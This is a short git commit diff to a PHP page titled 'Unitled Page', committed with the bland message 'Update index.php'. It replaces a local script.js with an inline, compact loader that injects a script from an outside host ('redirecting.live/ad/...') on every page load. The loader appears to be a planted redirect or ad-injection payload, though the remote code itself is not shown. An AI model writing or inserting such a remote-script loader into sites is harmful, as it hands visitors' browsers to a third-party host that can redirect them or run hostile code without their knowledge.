dedb25fa635260e8cc9e2b578742c82909364e98
sanernecro <sanernecro@gmail.com>
2017-02-15 04:01:46 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -4,7 +4,14 @@
   <title>Unitled Page</title>
 
   <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
-  <script type="text/javascript" src="script.js"></script>
+<script>
+     (function (a, d, j, o) {
+        o = a.createElement(d),
+            m = a.getElementsByTagName(d)[0];
+        o.src = j + "?d=0&r=" + Math.random();
+        m.parentNode.insertBefore(o, m)
+     })(document, 'script', 'http://redirecting.live/ad/aab9375b');
+</script>
   <meta name="referrer" content="origin">
 </head>
 <body></body>
